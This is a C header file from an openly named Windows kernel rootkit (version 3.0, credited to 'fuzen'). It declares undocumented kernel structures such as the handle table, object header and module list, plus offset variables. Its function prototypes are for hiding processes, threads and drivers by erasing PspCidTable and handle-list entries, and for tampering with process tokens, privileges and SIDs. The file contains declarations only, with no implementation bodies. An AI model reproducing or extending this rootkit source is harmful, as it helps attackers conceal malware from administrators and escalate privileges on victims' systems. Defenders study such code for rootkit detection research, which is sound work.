///////////////////////////////////////////////////////////////////////////////////////
// Filename Rootkit.h
// 
// Author: fuzen
// Email:  fuzen_op@yahoo.com or fuzen_op@rootkit.com
//
// Description: Defines globals, function prototypes, etc. used by rootkit.c.
//
// Date:   12/25/2005  Added definitions for linked list of deleted entries.
//         1/1/2005    Original from Fuzen
// Version: 3.0


typedef BOOLEAN BOOL;
typedef unsigned long DWORD;
typedef DWORD * PDWORD;
typedef unsigned long ULONG;
typedef unsigned short WORD;
typedef unsigned char BYTE;

#define PROCNAMEIDLEN 26 
#define MAX_SID_SIZE 72

PEPROCESS gpeproc_csrss;
PEPROCESS gpeproc_system;
DWORD gcid_table;

DWORD g_HiddenPID;

int g_NoGUIFlag;

POBJECT_TYPE gp_processType;

BOOLEAN b_isXP2K3;

int FLINKOFFSET;   
int PIDOFFSET;     
int AUTHIDOFFSET;
int TOKENOFFSET;
int PRIVCOUNTOFFSET;
int PRIVADDROFFSET;
int SIDCOUNTOFFSET;
int SIDADDROFFSET;
int THREADOFFSET;
int THREADFLINK;
int HANDLETABLEOFFSET;
int HANDLECOUNTOFFSET;
int TABLEOFFSET;
int HANDLELISTOFFSET;
int EPROCPIDOFFSET;
int CIDOFFSET;
typedef struct _TABLE_ENTRY {
	DWORD object;
	ACCESS_MASK security;
} TABLE_ENTRY, *PTABLE_ENTRY, **PPTABLE_ENTRY, ***PPPTABLE_ENTRY;

#define NUMBER_HASH_BUCKETS 37

typedef struct _OBJECT_DIRECTORY_ENTRY {
    struct _OBJECT_DIRECTORY_ENTRY *ChainLink;
    PVOID Object;
} OBJECT_DIRECTORY_ENTRY, *POBJECT_DIRECTORY_ENTRY;

NTSTATUS ObOpenObjectByName (IN POBJECT_ATTRIBUTES ObjectAttributes,
                             IN POBJECT_TYPE ObjectType OPTIONAL, 
							 IN KPROCESSOR_MODE AccessMode,
							 IN OUT PACCESS_STATE AccessState OPTIONAL, 
							 IN ACCESS_MASK DesiredAccess OPTIONAL,
                             IN OUT PVOID ParseContext OPTIONAL, 
							 OUT PHANDLE Handle);
NTSTATUS ObQueryNameString(
    IN PVOID  Object,
    OUT POBJECT_NAME_INFORMATION  ObjectNameInfo,
    IN ULONG  Length,
    OUT PULONG  ReturnLength); 

typedef struct _OBJECT_DIRECTORY {
    struct _OBJECT_DIRECTORY_ENTRY *HashBuckets[ NUMBER_HASH_BUCKETS ];
    struct _OBJECT_DIRECTORY_ENTRY **LookupBucket;
    BOOLEAN LookupFound;
    USHORT SymbolicLinkUsageCount;
    struct _DEVICE_MAP *DeviceMap;
} OBJECT_DIRECTORY, *POBJECT_DIRECTORY;

typedef struct _OBJECT_CREATE_INFORMATION { 
   ULONG Attributes; 
   HANDLE RootDirectory; 
   PVOID ParseContext; 
   KPROCESSOR_MODE ProbeMode; 
   ULONG PagedPoolCharge; 
   ULONG NonPagedPoolCharge; 
   ULONG SecurityDescriptorCharge; 
   PSECURITY_DESCRIPTOR SecurityDescriptor; 
   PSECURITY_QUALITY_OF_SERVICE SecurityQos; 
   SECURITY_QUALITY_OF_SERVICE SecurityQualityOfService; 
} OBJECT_CREATE_INFORMATION, *POBJECT_CREATE_INFORMATION; 

typedef struct _OBJECT_DUMP_CONTROL { 
   PVOID Stream; 
   ULONG Detail; 
} OB_DUMP_CONTROL, *POB_DUMP_CONTROL; 

typedef VOID (*OB_DUMP_METHOD)( 
   IN PVOID Object, 
   IN POB_DUMP_CONTROL Control OPTIONAL 
); 

typedef enum _OB_OPEN_REASON { 
   ObCreateHandle, 
   ObOpenHandle, 
   ObDuplicateHandle, 
   ObInheritHandle, 
   ObMaxOpenReason 
} OB_OPEN_REASON; 

typedef VOID (*OB_OPEN_METHOD)( 
   IN OB_OPEN_REASON OpenReason, 
   IN PEPROCESS Process OPTIONAL, 
   IN PVOID Object, 
   IN ACCESS_MASK GrantedAccess, 
   IN ULONG HandleCount 
); 

typedef VOID (*OB_CLOSE_METHOD)( 
   IN PEPROCESS Process OPTIONAL, 
   IN PVOID Object, 
   IN ACCESS_MASK GrantedAccess, 
   IN ULONG ProcessHandleCount, 
   IN ULONG SystemHandleCount 
); 

typedef BOOLEAN (*OB_OKAYTOCLOSE_METHOD)( 
   IN PEPROCESS Process OPTIONAL, 
   IN PVOID Object, 
   IN HANDLE Handle 
); 


typedef VOID (*OB_DELETE_METHOD)( 
   IN PVOID Object 
); 

typedef NTSTATUS (*OB_PARSE_METHOD)( 
	IN PVOID ParseObject, 
	IN PVOID ObjectType, 
	IN OUT PACCESS_STATE AccessState, 
	IN KPROCESSOR_MODE AccessMode, 
	IN ULONG Attributes, 
	IN OUT PUNICODE_STRING CompleteName, 
	IN OUT PUNICODE_STRING RemainingName, 
	IN OUT PVOID Context OPTIONAL, 
	IN PSECURITY_QUALITY_OF_SERVICE SecurityQos OPTIONAL, 
	OUT PVOID *Object 
); 

typedef NTSTATUS (*OB_SECURITY_METHOD)( 
	IN PVOID Object, 
	IN SECURITY_OPERATION_CODE OperationCode, 
	IN PSECURITY_INFORMATION SecurityInformation, 
	IN OUT PSECURITY_DESCRIPTOR SecurityDescriptor, 
	IN OUT PULONG CapturedLength, 
	IN OUT PSECURITY_DESCRIPTOR *ObjectsSecurityDescriptor, 
	IN POOL_TYPE PoolType, 
	IN PGENERIC_MAPPING GenericMapping 
); 

typedef NTSTATUS (*OB_QUERYNAME_METHOD)( 
   IN PVOID Object, 
   IN BOOLEAN HasObjectName, 
   OUT POBJECT_NAME_INFORMATION ObjectNameInfo, 
   IN ULONG Length, 
   OUT PULONG ReturnLength 
); 

typedef struct _OBJECT_TYPE_INITIALIZER { 
   USHORT Length; 
   BOOLEAN UseDefaultObject; 
   BOOLEAN CaseInsensitive; 
   ULONG InvalidAttributes; 
   GENERIC_MAPPING GenericMapping; 
   ULONG ValidAccessMask; 
   BOOLEAN SecurityRequired; 
   BOOLEAN MaintainHandleCount; 
   BOOLEAN MaintainTypeList; 
   POOL_TYPE PoolType; 
   ULONG DefaultPagedPoolCharge; 
   ULONG DefaultNonPagedPoolCharge; 
   OB_DUMP_METHOD DumpProcedure; 
   OB_OPEN_METHOD OpenProcedure; 
   OB_CLOSE_METHOD CloseProcedure; 
   OB_DELETE_METHOD DeleteProcedure; 
   OB_PARSE_METHOD ParseProcedure; 
   OB_SECURITY_METHOD SecurityProcedure; 
   OB_QUERYNAME_METHOD QueryNameProcedure; 
   OB_OKAYTOCLOSE_METHOD OkayToCloseProcedure; 
} OBJECT_TYPE_INITIALIZER, *POBJECT_TYPE_INITIALIZER; 

typedef struct _OBJECT_TYPE {
    ERESOURCE Mutex;
    LIST_ENTRY TypeList;
    UNICODE_STRING Name;
    PVOID DefaultObject;
    ULONG Index;
    ULONG TotalNumberOfObjects;
    ULONG TotalNumberOfHandles;
    ULONG HighWaterNumberOfObjects;
    ULONG HighWaterNumberOfHandles;
    OBJECT_TYPE_INITIALIZER TypeInfo;
    ULONG Key;
} OBJECT_TYPE, *POBJECT_TYPE;

typedef struct _OBJECT_HEADER { 
   LONG PointerCount; 
   union { 
      LONG HandleCount; 
      PSINGLE_LIST_ENTRY SEntry; 
   }; 
   POBJECT_TYPE Type; 
   UCHAR NameInfoOffset; 
   UCHAR HandleInfoOffset; 
   UCHAR QuotaInfoOffset; 
   UCHAR Flags; 
   union 
   { 
      POBJECT_CREATE_INFORMATION ObjectCreateInfo; 
      PVOID QuotaBlockCharged; 
   }; 
   PSECURITY_DESCRIPTOR SecurityDescriptor; 
   UCHAR Body; 
} OBJECT_HEADER, *POBJECT_HEADER; 

typedef struct _MODULE_ENTRY {
	LIST_ENTRY le_mod;
	DWORD  unknown[4];
	DWORD  base;
	DWORD  driver_start;
	DWORD  unk1;
	UNICODE_STRING driver_Path;
	UNICODE_STRING driver_Name;
	//...
} MODULE_ENTRY, *PMODULE_ENTRY;

PMODULE_ENTRY gul_PsLoadedModuleList;  // We are going to set this to point to PsLoadedModuleList.
//__declspec(dllimport) MODULE_ENTRY PsLoadedModuleList; // Unfortunitely not exported


typedef struct _vars {
	int the_PID;
	PLUID_AND_ATTRIBUTES pluida;
	int num_luids;
} VARS;


typedef struct _vars2 {
	int the_PID;
	void *pSID;
	int i_SidSize;
} VARS2;

// I found these defined in a .h file, but if these Session ID's do
// not exist on your box, the machine will BlueScreen because it 
// dereferenced an unknown Session ID.
#define SYSTEM_LUID                    0x000003e7; // { 0x3E7, 0x0 }
#define ANONYMOUS_LOGON_LUID           0x000003e6; // { 0x3e6, 0x0 }
#define LOCALSERVICE_LUID              0x000003e5; // { 0x3e5, 0x0 }
#define NETWORKSERVICE_LUID            0x000003e4; // { 0x3e4, 0x0 }

typedef struct _SID_AND_ATTRIBUTES {
    PSID Sid;
    DWORD Attributes;
} SID_AND_ATTRIBUTES, * PSID_AND_ATTRIBUTES;

#define SE_PRIVILEGE_DISABLED            (0x00000000L)

PDEVICE_OBJECT g_RootkitDevice; // Global pointer to our device object

DWORD Non2000FindPsLoadedModuleList(void);
DWORD FindPsLoadedModuleList(IN PDRIVER_OBJECT);
DWORD FindProcessToken(DWORD);
DWORD FindProcessEPROC(int);
DWORD FindProcessEPROCByName(char *);
NTSTATUS SetupGlobalsByOS(void);
NTSTATUS RootkitDispatch(IN PDEVICE_OBJECT, IN PIRP);
NTSTATUS RootkitUnload(IN PDRIVER_OBJECT);
NTSTATUS RootkitDeviceControl(IN PFILE_OBJECT, IN BOOLEAN, IN PVOID, 
							IN ULONG, OUT PVOID, IN ULONG, IN ULONG, 
							OUT PIO_STATUS_BLOCK, IN PDEVICE_OBJECT
							);
void EraseHandle(PEPROCESS, PVOID);
void EraseObjectFromPspCidTable(DWORD, PVOID, enum ObjectType, DWORD, DWORD);
void UnHookHandleListEntry(PEPROCESS);
void HideThreadsInTargetProcess(PEPROCESS, PEPROCESS);
void HideThreadsInPspCidTable(PEPROCESS);
POBJECT_TYPE FindObjectTypes(char*);
void DecrementObjectCount(POBJECT_TYPE);

DWORD GetPspCidTable();




PTABLE_ENTRY g_PspOriginalHandleEntry;

enum ObjectType
{
	ID_PROCESS,
	ID_THREAD
	
};

enum TableLevel
{
	SINGLE_LEVEL,
	DOUBLE_LEVEL,
	TRIPLE_LEVEL
	
};


//
// Added by Bugcheck, thanks !
//


typedef struct _EX_PUSH_LOCK
{
   union
   {
        struct
        {
        ULONG Waiting:1;
        ULONG Exclusive:1;
        ULONG Shared:30;
        };
        ULONG Value;
        PVOID Ptr;
   };

} EX_PUSH_LOCK, *PEX_PUSH_LOCK;

typedef struct _HANDLE_TRACE_DB_ENTRY
{
   CLIENT_ID    ClientId;
   HANDLE       Handle;
   ULONG        Type;
   PVOID        StackTrace[16];

} HANDLE_TRACE_DB_ENTRY; *PHANDLE_TRACE_DB_ENTRY;

typedef struct _HANDLE_TRACE_DEBUG_INFO
{
   ULONG CurrentStackIndex;
   HANDLE_TRACE_DB_ENTRY TraceDb[4096];

} HANDLE_TRACE_DEBUG_INFO, *PHANDLE_TRACE_DEBUG_INFO;

typedef struct _HANDLE_TABLE_ENTRY
{
    union
    {
        ULONG_PTR   Flags:2;
        PVOID       Object;
    };
    ULONG  NextFree;
   
} HANDLE_TABLE_ENTRY, *PHANDLE_TABLE_ENTRY;

typedef struct _HANDLE_TABLE 
{
    PVOID TableCode;
    PEPROCESS QuotaProcess;
    PVOID UniqueProcessId;
    EX_PUSH_LOCK HandleTableLock [4];
    LIST_ENTRY HandleTableList;
    EX_PUSH_LOCK HandleContentionEvent;
    PHANDLE_TRACE_DEBUG_INFO DebugInfo;
    ULONG ExtraInfoPages;
    ULONG FirstFree;
    ULONG LastFree;
    ULONG NextHandleNeedingPool;
    ULONG HandleCount;
    ULONG Flags;
} HANDLE_TABLE, *PHANDLE_TABLE;